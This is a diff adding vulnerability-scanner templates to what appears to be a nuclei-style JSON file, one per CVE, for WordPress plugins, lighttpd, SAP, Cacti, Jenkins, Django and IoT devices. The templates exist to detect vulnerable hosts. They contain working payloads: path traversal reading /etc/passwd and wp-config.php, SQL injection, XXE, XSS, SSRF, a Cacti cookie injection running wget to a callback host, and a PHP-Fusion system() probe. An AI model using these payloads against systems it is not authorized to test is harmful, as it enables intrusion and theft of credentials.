@@ -1736,6 +1736,45 @@
       ]
     },
     {
+      "id": "CVE-2013-7240",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in download-file.php in the Advanced Dewplayer plugin 1.2 for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the dew_file parameter.",
+        "name": "WordPress Plugin Advanced Dewplayer 1.2 - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/38936\n- https://nvd.nist.gov/vuln/detail/CVE-2013-7240\n",
+        "severity": "high",
+        "tags": "cve,cve2013,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "DB_NAME",
+                "DB_PASSWORD",
+                "DB_HOST",
+                "The base configurations of the WordPress"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2014-2321",
       "info": {
         "author": "geeknik",
@@ -1776,6 +1815,33 @@
       ]
     },
     {
+      "id": "CVE-2014-2323",
+      "info": {
+        "author": "geeknik",
+        "description": "SQL injection vulnerability in mod_mysql_vhost.c in lighttpd before 1.4.35 allows remote attackers to execute arbitrary SQL commands via the host name, related to request_check_hostname.",
+        "name": "Lighttpd 1.4.34 SQL injection and path traversal",
+        "reference": "https://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt",
+        "severity": "critical",
+        "tags": "cve,cve2014,sqli,lighttpd"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "raw": [
+            "GET /etc/passwd HTTP/1.1\nHost: [::1]' UNION SELECT '/\n\n"
+          ],
+          "unsafe": true
+        }
+      ]
+    },
+    {
       "id": "arbitrary-file-read-in-dompdf",
       "info": {
         "author": "0x_Akoko",
@@ -1810,6 +1876,40 @@
             "{{BaseURL}}/PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=dompdf.php",
             "{{BaseURL}}/lib/dompdf/dompdf.php?input_file=dompdf.php",
             "{{BaseURL}}/includes/dompdf/dompdf.php?input_file=dompdf.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-2962",
+      "info": {
+        "author": "daffainfo",
+        "description": "Path traversal vulnerability in the webproc cgi module on the Belkin N150 F9K1009 v1 router with firmware before 1.00.08 allows remote attackers to read arbitrary files via a full pathname in the getpage parameter.",
+        "name": "Belkin N150 Router 1.00.08/1.00.09 - Directory Traversal",
+        "reference": "https://www.exploit-db.com/exploits/38488",
+        "severity": "high",
+        "tags": "cve,cve2014,lfi,router"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo"
           ]
         }
       ]
@@ -2049,6 +2149,39 @@
             "{{BaseURL}}/test.cgi",
             "{{BaseURL}}/debug.cgi",
             "{{BaseURL}}/cgi-bin/test-cgi"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-6308",
+      "info": {
+        "author": "daffainfo",
+        "name": "Osclass Security Advisory 3.4.1 - Local File Inclusion",
+        "reference": "https://packetstormsecurity.com/files/128285/OsClass-3.4.1-Local-File-Inclusion.html",
+        "severity": "high",
+        "tags": "cve,cve2014,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/osclass/oc-admin/index.php?page=appearance&action=render&file=../../../../../../../../../../etc/passwd"
           ]
         }
       ]
@@ -2564,6 +2697,89 @@
       ]
     },
     {
+      "id": "CVE-2016-0957",
+      "info": {
+        "author": "geeknik",
+        "description": "Dispatcher before 4.1.5 in Adobe Experience Manager 5.6.1, 6.0.0, and 6.1.0 does not properly implement a URL filter, which allows remote attackers to bypass dispatcher rules via unspecified vectors.",
+        "name": "Adobe AEM Console Disclosure",
+        "reference": "https://www.kernelpicnic.net/2016/07/24/Microsoft-signout.live.com-Remote-Code-Execution-Write-Up.html",
+        "severity": "high",
+        "tags": "cve,cve2016,adobe,aem"
+      },
+      "requests": [
+        {
+          "header": [
+            {
+              "Authorization": "Basic YWRtaW46YWRtaW4K"
+            }
+          ],
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "Adobe",
+                "java.lang",
+                "(Runtime)"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/system/console?.css"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000126",
+      "info": {
+        "author": "daffainfo",
+        "name": "Admin Font Editor <= 1.8 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000126",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/admin-font-editor/css.php?size=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-1000127",
       "info": {
         "author": "daffainfo",
@@ -2940,6 +3156,129 @@
       ]
     },
     {
+      "id": "CVE-2016-1000137",
+      "info": {
+        "author": "daffainfo",
+        "name": "Hero Maps Pro 2.1.0 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "http://www.vapidlabs.com/wp/wp_advisory.php?v=658",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/hero-maps-pro/views/dashboard/index.php?v=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000138",
+      "info": {
+        "author": "daffainfo",
+        "name": "Admin Font Editor <= 1.8 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "http://www.vapidlabs.com/wp/wp_advisory.php?v=38",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/indexisto/assets/js/indexisto-inject.php?indexisto_index=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000140",
+      "info": {
+        "author": "daffainfo",
+        "name": "New Year Firework <= 1.1.9 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000140",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/new-year-firework/firework/index.php?text=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-1000152",
       "info": {
         "author": "daffainfo",
@@ -3157,6 +3496,7 @@
       "network": [
         {
           "host": [
+            "{{Hostname}}",
             "{{Hostname}}:5555"
           ],
           "inputs": [
@@ -5125,6 +5465,37 @@
       ]
     },
     {
+      "id": "CVE-2018-1000600",
+      "info": {
+        "author": "geeknik",
+        "description": "A exposure of sensitive information vulnerability exists in Jenkins GitHub Plugin 1.29.1 and earlier in GitHubTokenCredentialsCreator.java that allows attackers to an attacker-specified URL using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins.",
+        "name": "Pre-auth Fully-responded SSRF",
+        "reference": [
+          "https://www.jenkins.io/security/advisory/2018-06-25/#SECURITY-915",
+          "https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2018,jenkins,ssrf,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-1000861",
       "info": {
         "author": "dhiyaneshDK,pikpikcu",
@@ -6568,6 +6939,67 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/wp-content/plugins/wp-payeezy-pay/donate.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-2392",
+      "info": {
+        "author": "_generic_human_",
+        "description": "SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53 has two XXE vulnerabilities within the XMLCHART page - CVE-2018-2392 and CVE-2018-2393. These vulnerabilities occur due to a lack of appropriate validation on the Extension HTML tag when submitting a POST request to the XMLCHART page to generate a new chart.\n",
+        "name": "SAP Internet Graphics Server (IGS) XML External Entity",
+        "reference": [
+          "https://launchpad.support.sap.com/#/notes/2525222",
+          "https://blogs.sap.com/2018/02/13/sap-security-patch-day-february-2018/",
+          "https://www.rapid7.com/db/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe/",
+          "https://troopers.de/troopers18/agenda/3r38lr/",
+          "https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe.rb"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2018,sap,igs,xxe,xmlchart"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Picture",
+                "Info",
+                "/output/"
+              ]
+            },
+            {
+              "condition": "or",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "ImageMap",
+                "Errors"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html",
+                "SAP Internet Graphics Server"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /XMLCHART HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary={{randstr_1}}\n\n--{{randstr_1}}\nContent-Disposition: form-data; name=\"{{randstr_2}}\"; filename=\"{{randstr_3}}.xml\"\nContent-Type: application/xml\n\n<?xml version='1.0' encoding='UTF-8'?>\n    <ChartData>\n      <Categories>\n        <Category>ALttP</Category>\n      </Categories>\n      <Series label=\"{{randstr_4}}\">\n        <Point>\n          <Value type=\"y\">12345</Value>\n        </Point>\n      </Series>\n    </ChartData>\n--{{randstr_1}}\nContent-Disposition: form-data; name=\"{{randstr_5}}\"; filename=\"{{randstr_6}}.xml\"\nContent-Type: application/xml\n\n<?xml version='1.0' encoding='UTF-8'?>\n    <!DOCTYPE Extension [<!ENTITY xxe SYSTEM \"/etc/passwd\">]>\n    <SAPChartCustomizing version=\"1.1\">\n      <Elements>\n        <ChartElements>\n          <Title>\n            <Extension>&xxe;</Extension>\n          </Title>\n        </ChartElements>\n      </Elements>\n    </SAPChartCustomizing>\n--{{randstr_1}}--\n"
           ]
         }
       ]
@@ -12989,6 +13421,41 @@
       ]
     },
     {
+      "id": "CVE-2020-24949",
+      "info": {
+        "author": "geeknik",
+        "description": "Privilege escalation in PHP-Fusion 9.03.50 downloads/downloads.php allows an authenticated user (not admin) to send a crafted request to the server and perform remote command execution (RCE).",
+        "name": "PHPFusion 9.03.50 Remote Code Execution",
+        "reference": "https://packetstormsecurity.com/files/162852/phpfusion90350-exec.txt",
+        "severity": "high",
+        "tags": "cve,cve2020,phpfusion,rce,php"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "infusion_db.php"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/infusions/downloads/downloads.php?cat_id=${system(ls)}"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-25078",
       "info": {
         "author": "pikpikcu",
@@ -13903,6 +14370,34 @@
       ]
     },
     {
+      "id": "CVE-2020-35580",
+      "info": {
+        "author": "daffainfo",
+        "description": "Local File Inclusion vulnerability in the FileServlet in all SearchBlox before 9.2.2 allows remote, unauthenticated users to read arbitrary files from the operating system via a /searchblox/servlet/FileServlet?col=url= request. Additionally, this may be used to read the contents of the SearchBlox configuration file (e.g., searchblox/WEB-INF/config.xml), which contains both the Super Admin API key and the base64 encoded SHA1 password hashes of other SearchBlox users.",
+        "name": "SearchBlox < 9.2.2 - Local File Inclusion (LFI)",
+        "reference": "https://hateshape.github.io/general/2021/05/11/CVE-2020-35580.html",
+        "severity": "high",
+        "tags": "cve,cve2020,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/searchblox/servlet/FileServlet?col=9&url=/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-35713",
       "info": {
         "author": "gy741",
@@ -14659,6 +15154,59 @@
       ]
     },
     {
+      "id": "CVE-2020-6207",
+      "info": {
+        "author": "_generic_human_",
+        "description": "SAP Solution Manager (SolMan) running version 7.2 has CVE-2020-6207 vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem). The vulnerability occurs due to missing authentication checks when submitting SOAP requests to the /EemAdminService/EemAdmin page to get information about connected SMDAgents, send HTTP request (SSRF), and execute OS commands on connected SMDAgent.\n",
+        "name": "SAP Solution Manager remote unauthorized OS commands execution",
+        "reference": [
+          "https://launchpad.support.sap.com/#/notes/2890213",
+          "https://wiki.scn.sap.com/wiki/pages/viewpage.action?pageId=540935305",
+          "https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf",
+          "https://github.com/chipik/SAP_EEM_CVE-2020-6207",
+          "https://www.rapid7.com/db/modules/auxiliary/admin/sap/cve_2020_6207_solman_rce/",
+          "https://www.rapid7.com/db/modules/exploit/multi/sap/cve_2020_6207_solman_rs/"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2020,sap,solman,rce"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                ":Envelope",
+                ":Body",
+                ":getAllAgentInfoResponse"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/xml",
+                "SAP NetWeaver Application Server"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /EemAdminService/EemAdmin HTTP/1.1\nHost: {{Hostname}}\nSOAPAction: \"\"\nContent-Type: text/xml; charset=UTF-8\nConnection: close\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:adm=\"http://sap.com/smd/eem/admin/\"><soapenv:Header/><soapenv:Body><adm:getAllAgentInfo/></soapenv:Body></soapenv:Envelope>\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-6287",
       "info": {
         "author": "dwisiswant0",
@@ -15337,6 +15885,33 @@
       ]
     },
     {
+      "id": "CVE-2020-8813",
+      "info": {
+        "author": "gy741",
+        "description": "This vulnerability could be exploited without authentication if Cacti is enabling “Guest Realtime Graphs” privilege, So in this case no need for the authentication part and you can just use the following code to exploit the vulnerability",
+        "name": "Cacti v1.2.8 - Unauthenticated Remote Code Execution",
+        "reference": "- https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/\n",
+        "severity": "critical",
+        "tags": "cve,cve2020,cacti,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /graph_realtime.php?action=init HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.18.4\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nCookie: Cacti=%3Bwget%20http%3A//{{interactsh-url}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-8982",
       "info": {
         "author": "dwisiswant0",
@@ -15600,6 +16175,37 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/getcfg.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-9402",
+      "info": {
+        "author": "geeknik",
+        "description": "Django 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allows SQL Injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. By passing a suitably crafted tolerance to GIS functions and aggregates on Oracle, it was possible to break escaping and inject malicious SQL.",
+        "name": "Django SQL Injection",
+        "reference": "- https://github.com/vulhub/vulhub/tree/master/django/CVE-2020-9402\n- https://docs.djangoproject.com/en/3.0/releases/security/\n- https://nvd.nist.gov/vuln/detail/CVE-2020-9402\n",
+        "severity": "high",
+        "tags": "cve,cve2020,django,sqli"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "DatabaseError at",
+                "ORA-29257:",
+                "ORA-06512:",
+                "Request Method:"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1"
           ]
         }
       ]
@@ -16769,6 +17375,49 @@
       ]
     },
     {
+      "id": "CVE-2021-24291",
+      "info": {
+        "author": "geeknik",
+        "description": "The plugin was vulnerable to Reflected Cross-Site Scripting (XSS) issues via the gallery_id, tag, album_id and theme_id GET parameters passed to the bwg_frontend_data AJAX action (available to both unauthenticated and authenticated users)",
+        "name": "Photo Gallery < 1.5.69 - Multiple Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://wpscan.com/vulnerability/cfb982b2-8b6d-4345-b3ab-3d2b130b873a",
+        "severity": "medium",
+        "tags": "cve,cve2021,xss,wordpress,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "onmouseover=alert(document.domain)//",
+                "wp-content/uploads/photo-gallery"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1\"%20onmouseover=alert(document.domain)//"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24298",
       "info": {
         "author": "daffainfo",
@@ -17904,7 +18553,7 @@
         "name": "Hongdian Sensitive Information",
         "reference": "- https://ssd-disclosure.com/ssd-advisory-hongdian-h8922-multiple-vulnerabilities/\n- https://nvd.nist.gov/vuln/detail/CVE-2021-28150\n",
         "severity": "medium",
-        "tags": "cve,cve2021,hongdian,exposures"
+        "tags": "cve,cve2021,hongdian,exposure"
       },
       "requests": [
         {
@@ -18500,6 +19149,83 @@
       ]
     },
     {
+      "id": "CVE-2021-31249",
+      "info": {
+        "author": "geeknik",
+        "description": "A CRLF injection vulnerability was found on BF-430, BF-431, and BF-450M TCP/IP Converter devices from CHIYU Technology Inc due to a lack of validation on the parameter 'redirect' available on multiple CGI components.",
+        "name": "CHIYU TCP/IP Converter devices - CRLF injection",
+        "reference": "https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chiyu-iot-devices#cve-2021-31249",
+        "severity": "medium",
+        "tags": "cve,cve2021,chiyu,crlf,iot"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                302
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Location: setting.htm",
+                "<script>alert(document.domain)</script>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/man.cgi?redirect=setting.htm%0d%0a%0d%0a<script>alert(document.domain)</script>&failure=fail.htm&type=dev_name_apply&http_block=0&TF_ip0=192&TF_ip1=168&TF_ip2=200&TF_ip3=200&TF_port=&TF_port=&B_mac_apply=APPLY"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-31250",
+      "info": {
+        "author": "geeknik",
+        "description": "Several versions and models of CHIYU IoT devices are vulnerable to multiple Cross-Site Scripting flaws.",
+        "name": "CHIYU IoT XSS",
+        "reference": "https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chiyu-iot-devices#cve-2021-31250",
+        "severity": "medium",
+        "tags": "cve,cve2021,chiyu,xss,iot"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Authorization": "Basic OmFkbWlu"
+          },
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"><script>alert({{randstr}})</script>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/if.cgi?redirect=setting.htm&failure=fail.htm&type=ap_tcps_apply&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%28{{randstr}}%29%3C%2Fscript%3E&radio_ping_block=0&max_tcp=3&B_apply=APPLY"
+          ],
+          "redirects": true
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-3129",
       "info": {
         "author": "z3bd,pdteam",
@@ -18584,6 +19310,45 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/rewe/prod/web/rewe_go_check.php?config=rewe&version=7.5.0%3cscript%3econfirm({{randstr}})%3c%2fscript%3e&win=2707"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-31581",
+      "info": {
+        "author": "geeknik",
+        "name": "Akkadian Provisioning Manager MariaDB Credentials",
+        "reference": [
+          "https://threatpost.com/unpatched-bugs-provisioning-cisco-uc/166882/",
+          "https://www.rapid7.com/blog/post/2021/06/08/akkadian-provisioning-manager-multiple-vulnerabilities-disclosure/"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,akkadian,mariadb,disclosure"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "host:",
+                "name:",
+                "pass:"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/pme/database/pme/phinx.yml"
           ]
         }
       ]
@@ -18675,6 +19440,52 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/?layout=/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-33221",
+      "info": {
+        "author": "geeknik",
+        "description": "A 'service details' API endpoint discloses system and configuration information to an attacker without requiring authentication. This information includes DNS and NTP servers that the devices uses for time and host resolution. It also includes the internal hostname and IoT Controller version. A fully configured device in production may leak other, more sensitive information (API keys and tokens).",
+        "name": "CommScope Ruckus IoT Controller Unauthenticated Service Details",
+        "reference": "https://www.commscope.com/globalassets/digizuite/917216-faq-security-advisory-id-20210525-v1-0.pdf",
+        "severity": "medium",
+        "tags": "cve,cve2021,commscope,ruckus,debug"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            },
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "message",
+                "ok",
+                "data",
+                "dns",
+                "gateway"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/service/v1/service-details"
           ]
         }
       ]
@@ -18783,6 +19594,40 @@
       ]
     },
     {
+      "id": "CVE-2021-3377",
+      "info": {
+        "author": "geeknik",
+        "description": "The npm package ansi_up converts ANSI escape codes into HTML. In ansi_up v4, ANSI escape codes can be used to create HTML hyperlinks. Due to insufficient URL sanitization, this feature is affected by a cross-site scripting (XSS) vulnerability. This issue is fixed in v5.0.0.",
+        "name": "Ansi_up XSS",
+        "reference": "- https://doyensec.com/resources/Doyensec_Advisory_ansi_up4_XSS.pdf\n- https://github.com/drudru/ansi_up/commit/c8c726ed1db979bae4f257b7fa41775155ba2e27\n",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "com\"/onmouseover=\"alert(1)\">"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /\\u001B]8;;https://example.com\"/onmouseover=\"alert(1)\\u0007example\\u001B]8;;\\u0007 HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n\n"
+          ],
+          "unsafe": true
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-3378",
       "info": {
         "author": "dwisiswant0",
@@ -18822,6 +19667,49 @@
           "raw": [
             "POST /Config/SaveUploadedHotspotLogoFile HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS\nAccept: application/json\nReferer: {{BaseURL}}\nConnection: close\nX-Requested-With: XMLHttpRequest\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"file\"; filename=\"poc.txt\"\nContent-Type: image/png\n\nPOC_TEST\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\n",
             "GET /Assets/temp/hotspot/img/logohotspot.txt HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-33904",
+      "info": {
+        "author": "geeknik",
+        "description": "In Accela Civic Platform through 21.1, the security/hostSignon.do parameter servProvCode is vulnerable to XSS.",
+        "name": "Accela Civic Platform 21.1 - 'servProvCode' XSS",
+        "reference": "https://www.exploit-db.com/exploits/49980",
+        "severity": "medium",
+        "tags": "cve,cve2021,accela,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "\"k3woq\"^confirm(document.domain)^\"a2pbrnzx5a9\"",
+                "servProvCode"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/security/hostSignon.do?hostSignOn=true&servProvCode=k3woq%22%5econfirm(document.domain)%5e%22a2pbrnzx5a9"
           ]
         }
       ]
